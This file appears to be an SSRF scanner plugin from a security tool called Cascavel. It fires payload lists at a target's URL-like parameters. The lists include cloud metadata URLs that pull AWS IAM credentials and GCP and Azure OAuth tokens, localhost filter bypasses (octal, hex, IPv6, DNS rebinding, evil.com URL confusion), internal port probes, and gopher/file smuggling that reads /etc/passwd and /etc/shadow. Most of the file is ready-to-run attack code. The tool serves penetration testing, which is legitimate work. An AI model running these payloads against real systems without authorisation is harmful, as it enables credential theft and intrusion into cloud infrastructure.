# plugins/ssrf_scanner.py — Cascavel 2026 Intelligence
import time
import urllib.parse

import requests

PARAMS = [
    "url",
    "link",
    "src",
    "href",
    "path",
    "file",
    "page",
    "site",
    "feed",
    "proxy",
    "callback",
    "redirect",
    "img",
    "image",
    "load",
    "fetch",
    "uri",
    "endpoint",
    "webhook",
    "dest",
    "target",
    "domain",
    "host",
    "return",
    "next",
    "data",
    "reference",
    "resource",
    "location",
    "go",
    "out",
]

# ──────────── CLOUD METADATA ENDPOINTS ────────────
CLOUD_METADATA = [
    # AWS IMDSv1
    ("http://169.254.169.254/latest/meta-data/", "AWS_IMDSv1", ["ami-id", "instance-id", "local-ipv4"]),
    (
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "AWS_IAM_CREDS",
        ["AccessKeyId", "SecretAccessKey"],
    ),
    ("http://169.254.169.254/latest/user-data/", "AWS_USER_DATA", ["#!", "password", "key"]),
    ("http://169.254.169.254/latest/dynamic/instance-identity/document", "AWS_INSTANCE_ID", ["instanceId", "region"]),
    # GCP
    ("http://metadata.google.internal/computeMetadata/v1/project/project-id", "GCP_PROJECT", ["project"]),
    (
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "GCP_TOKEN",
        ["access_token"],
    ),
    ("http://metadata.google.internal/computeMetadata/v1/instance/attributes/", "GCP_ATTRIBUTES", ["ssh-keys"]),
    # Azure
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "AZURE_IMDS", ["vmId", "subscriptionId"]),
    (
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        "AZURE_TOKEN",
        ["access_token"],
    ),
    # DigitalOcean
    ("http://169.254.169.254/metadata/v1/", "DO_METADATA", ["droplet_id"]),
    ("http://169.254.169.254/metadata/v1/interfaces/private/0/ipv4/address", "DO_PRIVATE_IP", ["10."]),
    # Alibaba Cloud
    ("http://100.100.100.200/latest/meta-data/", "ALIBABA_METADATA", ["instance-id"]),
    # Oracle Cloud
    ("http://169.254.169.254/opc/v2/instance/", "ORACLE_METADATA", ["availabilityDomain"]),
    # Kubernetes
    ("https://kubernetes.default.svc/api/v1/namespaces", "K8S_API", ["namespace"]),
    # ECS Container
    ("http://169.254.170.2/v2/credentials/", "ECS_CREDS", ["AccessKeyId"]),
]

# ──────────── LOCALHOST BYPASS VARIANTS ────────────
LOCALHOST_BYPASS = [
    ("http://127.0.0.1/", "LOCALHOST"),
    ("http://0177.0.0.1/", "OCTAL"),
    ("http://2130706433/", "DECIMAL"),
    ("http://0x7f000001/", "HEX"),
    ("http://127.1/", "SHORT"),
    ("http://[::1]/", "IPV6_LOOPBACK"),
    ("http://[::ffff:127.0.0.1]/", "IPV6_MAPPED"),
    ("http://[0:0:0:0:0:ffff:127.0.0.1]/", "IPV6_FULL"),
    ("http://0.0.0.0/", "ZERO_IP"),
    ("http://127.0.0.1.nip.io/", "DNS_REBIND_NIP"),
    ("http://spoofed.burpcollaborator.net/", "DNS_REBIND_BURP"),
    ("http://localtest.me/", "DNS_REBIND_LOCALTEST"),
    # URL parsing confusion
    ("http://evil.com@127.0.0.1/", "AT_SIGN_BYPASS"),
    ("http://127.0.0.1#@evil.com/", "FRAGMENT_BYPASS"),
    ("http://127.0.0.1%00@evil.com/", "NULL_BYTE_BYPASS"),
    ("http://127.0.0.1:80\\@evil.com/", "BACKSLASH_BYPASS"),
]

# ──────────── INTERNAL SERVICE PORTS ────────────
INTERNAL_SERVICES = [
    ("http://127.0.0.1:22/", "SSH", "SSH-"),
    ("http://127.0.0.1:3306/", "MYSQL", "mysql"),
    ("http://127.0.0.1:5432/", "POSTGRES", "postgres"),
    ("http://127.0.0.1:6379/", "REDIS", "redis_version"),
    ("http://127.0.0.1:9200/", "ELASTICSEARCH", "elasticsearch"),
    ("http://127.0.0.1:27017/", "MONGODB", "mongo"),
    ("http://127.0.0.1:8500/v1/agent/self", "CONSUL", "consul"),
    ("http://127.0.0.1:2379/version", "ETCD", "etcdserver"),
    ("http://127.0.0.1:8080/", "INTERNAL_WEB", "<html"),
    ("http://127.0.0.1:9090/", "PROMETHEUS", "prometheus"),
    ("http://127.0.0.1:3000/", "GRAFANA", "grafana"),
    ("http://127.0.0.1:15672/", "RABBITMQ", "rabbitmq"),
]

# ──────────── PROTOCOL SMUGGLING ────────────
PROTOCOL_PAYLOADS = [
    ("gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a", "GOPHER_REDIS"),
    ("file:///etc/passwd", "FILE_PROTO"),
    ("file:///etc/shadow", "FILE_SHADOW"),
    ("dict://127.0.0.1:6379/INFO", "DICT_REDIS"),
    ("ftp://127.0.0.1/", "FTP_INTERNAL"),
    ("ldap://127.0.0.1/", "LDAP_INTERNAL"),
    ("tftp://127.0.0.1/etc/passwd", "TFTP_INTERNAL"),
]


def _get_404_baseline(target):
    """Calcula o tamanho de uma página de erro genérica."""
    try:
        resp = requests.get(f"http://{target}/cascavel_invalid_page_12345", timeout=5)
        return len(resp.text)
    except Exception:
        return 0


def _get_baseline_latency(target):
    """Calcula a latência base do alvo para evitar falsos positivos time-based."""
    try:
        start = time.time()
        requests.get(f"http://{target}/?url=http://non_existent_cascavel_123.local/", timeout=5)
        return time.time() - start
    except Exception:
        return 0.5


def _test_cloud_metadata(target, param):
    """Testa SSRF contra cloud metadata endpoints."""
    vulns = []
    baseline_len = _get_404_baseline(target)
    for internal_url, label, indicators in CLOUD_METADATA:
        url = f"http://{target}/?{param}={urllib.parse.quote(internal_url, safe='')}"
        try:
            headers = {"User-Agent": "Cascavel/2.0"}
            # GCP requires Metadata-Flavor header
            if "google" in internal_url:
                headers["Metadata-Flavor"] = "Google"
            resp = requests.get(url, timeout=8, allow_redirects=True, headers=headers)
            if resp.status_code == 200:
                resp_len = len(resp.text)
                if baseline_len > 0 and abs(resp_len - baseline_len) / baseline_len < 0.05:
                    continue  # Falso positivo: Soft-404 genérico

                for indicator in indicators:
                    if indicator in resp.text:
                        severity = "CRITICO"
                        desc = f"SSRF → {label}"
                        if "AccessKeyId" in resp.text or "SecretAccessKey" in resp.text:
                            desc = "AWS CREDENTIALS EXPOSTAS via SSRF!"
                        elif "access_token" in resp.text:
                            desc = f"OAuth Token exposto via SSRF ({label})!"
                        vulns.append(
                            {
                                "tipo": "SSRF_CLOUD_METADATA",
                                "parametro": param,
                                "payload": internal_url,
                                "alvo": label,
                                "indicador": indicator,
                                "severidade": severity,
                                "descricao": desc,
                                "amostra": resp.text[:300],
                            }
                        )
                        break
        except Exception:
            continue
    return vulns


def _test_localhost_bypass(target, param):
    """Testa bypass de validação de URL targeting localhost."""
    vulns = []
    for bypass_url, method in LOCALHOST_BYPASS:
        url = f"http://{target}/?{param}={urllib.parse.quote(bypass_url, safe='')}"
        try:
            resp = requests.get(url, timeout=6, allow_redirects=True)
            if resp.status_code == 200 and len(resp.text) > 50:
                # Check if response is different from a normal 404/error
                baseline = requests.get(f"http://{target}/?{param}=http://invalid.cascavel.test/", timeout=4)
                if len(resp.text) != len(baseline.text):
                    vulns.append(
                        {
                            "tipo": "SSRF_LOCALHOST_BYPASS",
                            "metodo": method,
                            "parametro": param,
                            "severidade": "ALTO",
                            "descricao": f"SSRF bypass via {method}!",
                        }
                    )
                    break
        except Exception:
            continue
    return vulns


def _test_internal_services(target, param, baseline_latency):
    """Testa SSRF para descobrir serviços internos."""
    vulns = []
    for service_url, service, indicator in INTERNAL_SERVICES:
        url = f"http://{target}/?{param}={urllib.parse.quote(service_url, safe='')}"
        try:
            start = time.time()
            resp = requests.get(url, timeout=6, allow_redirects=True)
            elapsed = time.time() - start
            if resp.status_code == 200 and indicator in resp.text.lower():
                vulns.append(
                    {
                        "tipo": "SSRF_INTERNAL_SERVICE",
                        "servico": service,
                        "parametro": param,
                        "severidade": "ALTO",
                        "descricao": f"Serviço interno {service} acessível via SSRF!",
                    }
                )
            # Time-based detection (port open vs closed) validado contra baseline
            elif elapsed > (baseline_latency + 2.5):
                vulns.append(
                    {
                        "tipo": "SSRF_PORT_OPEN",
                        "servico": service,
                        "parametro": param,
                        "tempo": round(elapsed, 2),
                        "baseline": round(baseline_latency, 2),
                        "severidade": "MEDIO",
                    }
                )
        except Exception:
            continue
    return vulns


def _test_protocol_smuggling(target, param):
    """Testa SSRF via protocol smuggling (gopher, file, dict, ftp, ldap)."""
    vulns = []
    for payload, method in PROTOCOL_PAYLOADS:
        url = f"http://{target}/?{param}={urllib.parse.quote(payload, safe='')}"
        try:
            resp = requests.get(url, timeout=8, allow_redirects=True)
            if resp.status_code == 200 and len(resp.text) > 20:
                if "root:" in resp.text or "redis" in resp.text.lower():
                    vulns.append(
                        {
                            "tipo": "SSRF_PROTOCOL_SMUGGLING",
                            "metodo": method,
                            "parametro": param,
                            "severidade": "CRITICO",
                            "descricao": f"Protocol smuggling via {method}!",
                            "amostra": resp.text[:200],
                        }
                    )
        except Exception:
            continue
    return vulns


def _test_post_ssrf(target, param):
    """Testa SSRF via POST body (JSON + form-data)."""
    try:
        baseline = requests.post(
            f"http://{target}/",
            json={param: "http://invalid.cascavel.test/"},
            timeout=6,
            headers={"Content-Type": "application/json"},
        )
        baseline_len = len(baseline.text)
    except Exception:
        baseline_len = 0

    for internal_url, label, indicators in CLOUD_METADATA[:3]:
        try:
            resp = requests.post(
                f"http://{target}/", json={param: internal_url}, timeout=6, headers={"Content-Type": "application/json"}
            )
            resp_len = len(resp.text)
            if baseline_len > 0 and abs(resp_len - baseline_len) / baseline_len < 0.05:
                continue

            for indicator in indicators:
                if indicator in resp.text:
                    return {
                        "tipo": "SSRF_POST",
                        "parametro": param,
                        "payload": internal_url,
                        "alvo": label,
                        "severidade": "CRITICO",
                    }
        except Exception:
            continue
    return None


def run(target, ip, open_ports, banners):
    """
    Scanner SSRF 2026-Grade — Cloud Metadata, Protocol Smuggling, Bypass.

    Técnicas: 15 cloud metadata endpoints (AWS/GCP/Azure/DO/Alibaba/Oracle/K8s/ECS),
    16 localhost bypass variants (octal/hex/decimal/IPv6/DNS rebinding/URL parsing confusion),
    12 internal service scans (SSH/MySQL/PG/Redis/ES/MongoDB/Consul/Etcd/Prometheus/Grafana),
    7 protocol smuggling (gopher/file/dict/ftp/ldap/tftp),
    POST body SSRF, time-based port detection.
    """
    _ = (ip, open_ports, banners)
    vulns = []

    # Calibrar latência para não emitir falsos positivos no time-based SSRF
    baseline_latency = _get_baseline_latency(target)

    for param in PARAMS:
        # 1. Cloud metadata SSRF
        vulns.extend(_test_cloud_metadata(target, param))

        # 2. Localhost bypass
        vulns.extend(_test_localhost_bypass(target, param))

        # 3. Internal service discovery
        vulns.extend(_test_internal_services(target, param, baseline_latency))

        # 4. Protocol smuggling
        vulns.extend(_test_protocol_smuggling(target, param))

        # 5. POST-based SSRF
        post_vuln = _test_post_ssrf(target, param)
        if post_vuln:
            vulns.append(post_vuln)

    return {
        "plugin": "ssrf_scanner",
        "versao": "2026.1",
        "tecnicas": [
            "cloud_metadata",
            "localhost_bypass",
            "internal_services",
            "protocol_smuggling",
            "dns_rebinding",
            "url_parsing_confusion",
            "time_based_port",
            "post_ssrf",
        ],
        "resultados": vulns if vulns else "Nenhuma vulnerabilidade SSRF detectada",
    }
